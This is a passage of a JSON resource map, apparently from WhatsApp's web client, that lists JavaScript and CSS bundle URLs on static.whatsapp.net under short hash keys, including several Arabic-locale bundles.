                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yp\/r\/oRJudaJhcJb.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "STfNYsg": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/r\/NOl3nSdj5Uh.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "b+4kH42": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/cg3phlyJ-1B.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "HrSvOcT": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y4\/r\/21-3aT7RQ8b.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "aIstZuG": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y5\/r\/4Ex5otKRH3u.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "6V5ZFvF": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/-cmBNRC9qHk.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "SGCN92C": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yo\/r\/dAPd-mdkdFN.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "61rx7+d": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y4\/r\/GKxvddgm8SV.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "epaoL7R": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ym\/r\/w0U_JSIrUJn.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "DQmdiRz": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yY\/r\/N7CqNTPxP7e.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "RvYbgmg": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3irwZ4\/yL\/l\/ar_AR\/5pSj0XFFURw.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "xlMpWQZ": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/m81HXiJulf5.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "ww+w9NB": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/mQ_dC0DQ96y.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "t46GVsr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/r\/3QX3yaFWkhM.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Ayd2Csx": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/l\/1,cross\/An0tYMUUlvk.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "9zce+oe": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yd\/r\/b5H46z9Cl4X.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "asppkhA": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y5\/r\/PQw5R0QVhly.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "jjYsTQO": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yz\/r\/GvLXkts-ew_.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "UqUvMpW": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/r\/cqy5sWYK2yi.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Nx3aG7o": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/r\/CBuiJ_0o6vC.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "meXqvUG": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/r\/BQWILtvS5fB.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "K5\/vbf9": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yO\/r\/fRALbyo2PtK.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Gbf1TUE": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yU\/r\/irCGtkIPaVi.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "lTO89wT": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/l\/1,cross\/VlvCuYmGcGN.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "dUh4UaO": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/r\/uCEz0QZZJeE.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "aY\/DPr5": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yg\/r\/ls3MrukJA4r.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "CH1BQ+e": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/r\/FQnMY4wXA-1.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "IMwhxt6": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yf\/r\/GftAsZ4MgDN.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "LOtoMvf": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y1\/r\/NiENWwW1e0F.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "0C9ajyY": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yz\/r\/PK6LRymLZ-q.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "cEu\/il2": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iDXe4\/y-\/l\/ar_AR\/i4Qfb-7_YiB.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "ejUA2yq": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/3j8pqvn1nLW.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "LYq\/bb\/": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yi\/l\/1,cross\/-0he2st81ix.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "si7b3Zu": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y5\/r\/qFcVxai26gA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "txstYBE": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y1\/r\/WYsujcW9-qe.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "4gKni9p": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/l\/1,cross\/GjY-dP5IglQ.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "cIwjOS0": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yA\/r\/qL2HTURBxH2.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "hRnYGn1": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/r\/C1DdUjrra74.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "jWuQPCW": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/GmyguXmRmY9.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "VfuLkfj": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yX\/r\/zZHIBNAJKnh.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "XV0Z0ix": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/IP50YqMMQW7.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Cqzu\/ty": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/r\/QcPOxvKPtDI.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "vhkkr4i": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/z4VjNe4hDxP.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "l3xlu6+": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y_\/r\/PLjgfCSd4jd.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "nwf0WzB": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/r\/JryE5LHQY21.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "RG5qq+e": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y_\/r\/gu3kb4SNbxM.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "NQcY4GA": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yp\/r\/0SMW_5uzOy3.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "CvndCfq": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/rBvx5OxA8Dg.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "r92wvYV": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yl\/r\/deC1d5viPp9.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "uKw0LU7": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y-\/r\/0w5O3NCWM_m.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "QKv73eH": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yL\/r\/rfDc9Y3cxVc.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "xmz7Lk6": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yk\/l\/1,cross\/12yOzjcZccJ.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "UcjljO7": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yS\/l\/1,cross\/CDmikBmxMfm.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "a2j96E0": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iMhH4\/yo\/l\/ar_AR\/xP1GRaDgCXb.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "X4+I4b2": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/l\/1,cross\/yytLyJ2F8SD.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Gy3iOPf": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iGWm4\/yW\/l\/ar_AR\/AZ9A4Y6HYTN.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "v6HipfT": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3imgt4\/y2\/l\/ar_AR\/azsL0_2poh9.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "JFi5\/Gf": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yX\/r\/uHeU8iJ2qHm.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Yelqfuz": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y-\/r\/ZrDO1OS3CNE.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "oqSzzsl": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iJ9S4\/y8\/l\/ar_AR\/kVtFO5T-by9.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "VDymvVI": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/l\/1,cross\/btytK-RFo3s.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "8vKBOmk": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/l\/1,cross\/1ddtdQ9Ta0I.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "\/j+rPH4": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i1VK4\/ym\/l\/ar_AR\/GY9hwQm7hJX.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "tIfMNoz": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yU\/r\/NgcaOrtDnSB.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Kfkjcy2": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/3SnS2ZmKspL.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "lpxjhwr": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/l\/1,cross\/s-l6WI5lGFE.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "woU7G1a": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iECs4\/yv\/l\/ar_AR\/x08HEsZC8pv.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "18tbGeA": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/zyqKKLXLVLx.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "sJhkEUj": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yo\/r\/G46avKyqtTU.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "fQwhlTT": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yQ\/r\/VftRnkD_b4D.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "JIYg9tN": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yO\/r\/P8lwcLhElTK.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "hmc0Ch2": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y3\/r\/n-ZwnDSTvqK.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "ipCbG2E": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/l\/1,cross\/UzvF0-M5RNs.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "yyJPDys": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/l\/1,cross\/CFFbq5q-lZU.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "aHchuMx": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3ii6o4\/yC\/l\/ar_AR\/jXd2LFUTm_s.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "npROeLX": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yV\/l\/1,cross\/XkyVDkrmIsn.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "cWd25so": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yJ\/l\/1,cross\/57JSTbNI850.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "zL8BGdJ": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y9\/r\/44qHY6_bM8_.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "b\/rYFtF": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yB\/r\/hGd1ihAEoHH.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "b9sATVO": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/r\/oXAkgPAYF7S.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "UILE36u": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yU\/r\/8HOJ5HOwGNP.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "bY7KX1c": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yP\/r\/ODGAY_s0avx.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "rFUfoY0": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yT\/l\/1,cross\/TiGa-dPZl__.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "77m8Uso": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i38Q4\/yj\/l\/ar_AR\/OK_7GlcMV-Y.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "N6Acqql": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yQ\/r\/5-3kgMe1BPm.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "iL1+CJr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yH\/r\/H5KASR_hiwR.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "75NGeRh": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y6\/r\/zcDGmzpQz88.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "mt4kPQI": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yJ\/r\/i7d_rzPaE-5.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "JFd32jQ": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iHN74\/yj\/l\/ar_AR\/8v2CI9cP4JO.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "SdbMyyG": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ys\/r\/1CL6LQeeYDl.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "E2GxqIr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yX\/r\/j_1KG5PB_uc.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "VOUzw81": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/vYiKVCava9f.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "aH0wudu": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3itlT4\/y2\/l\/ar_AR\/Zv8WCRFj6TO.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "JOUMnNC": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yG\/r\/h8ulkmpky8f.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "CyTBEhs": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yj\/r\/15oHPYu4IOo.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "xsmPLsh": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yO\/l\/1,cross\/IFAQENtQuz9.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "FMT6aE+": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yC\/r\/7mV04TU_0tX.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "6nZvLTO": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ye\/r\/98nxpemaD2u.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "a3naK9z": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/r\/k2m8g6nEloR.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "kFLcRmC": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/r\/g1WGyWQnmtA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "JRCiEM5": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/r\/ClzJx5LtbuU.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "sS44P1S": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/r\/Ia-VMVZUO4n.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "x5nVXjr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yI\/r\/7OoBBn0ZoQN.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "0Rl2jG3": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yu\/r\/1dpQn2BCH2g.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "4OjCtT+": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y8\/l\/1,cross\/6MZLsIFxwA1.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "BpIXdTe": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yT\/r\/Fs_DBThxYqp.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "rMxyr0h": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y7\/r\/ldAgO4zgAdX.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Yj3DghY": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yU\/r\/HlY-6lDhXkA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "bi0U5fC": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/r\/Nxv7070la5s.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "4pji+mO": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/r\/nyxlX5HGCDk.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "iKt98vr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yb\/r\/AZAuu3fDtMI.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "THIInF6": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yC\/r\/bP1ZATRTi3o.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "xZEH36l": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/r\/0fZX16Q6iEq.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "X9TgX9v": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yE\/r\/-3yqehgppwN.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "IzGbJCP": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y1\/r\/wbgpPEKF3cQ.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Efro0lO": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yo\/r\/DTOMTfWUdPj.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "JF9eacU": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yQ\/r\/qn8-K3rQjpr.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "WqyjVeZ": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yz\/l\/1,cross\/Y8eV_7sjp09.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Wlujyda": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yt\/r\/UOejDzrhVY_.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "x+xW937": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iHhb4\/yi\/l\/ar_AR\/AZSePGq2x09.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "i9Ybuvr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/r\/aRGewqT3fu5.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "9M2cQ2O": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yf\/r\/HWxNe4_kWnU.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "DySm5eP": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yb\/r\/n24dx4Did3z.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "x37Rgcz": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yS\/r\/znP8Z-k99kg.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "pf45Yzv": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/wn_LjIGfUtA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "3d8QUxd": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3ihvv4\/yE\/l\/ar_AR\/DUs4hViDi_6.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "TOK2ldv": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yC\/l\/1,cross\/-Fvnt4hiL0K.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "sVPS\/Mn": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yH\/l\/1,cross\/6IFm5Ai7tpD.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "1kJuRsc": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iRZi4\/yl\/l\/ar_AR\/5Sgn-rxc7DD.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "SvmLjNk": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yl\/r\/IeQPIRkR1Be.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "JtkljLi": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yi\/r\/v70hf8FMTuA.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "WanF+UU": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yG\/r\/7p0Zz_puI1M.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "zr67Htb": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yG\/r\/aaIlyCCk1xR.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "GmCQyaS": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y7\/r\/TtI8bYeS23n.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "3tlrpJp": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yT\/r\/YdeAZh2hZ0w.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "6yux5SW": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/zWwKItWdj4e.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Q2l4aoI": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ys\/r\/qVrkzYbO0Y9.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Ko1cKDd": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yn\/r\/dMZ4h2j8S8i.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Tu5s6dr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yx\/r\/wvKJhJNWpKc.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "GYGLVxo": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y-\/r\/HhK-gwk4Z12.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "vTTlQAt": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yG\/l\/1,cross\/7l7Jzw67iUA.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "TuSYMUj": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iunv4\/y2\/l\/ar_AR\/xxc2ag42CG6.js?_nc_x=Ij3Wp8lg5Kz"
                        },
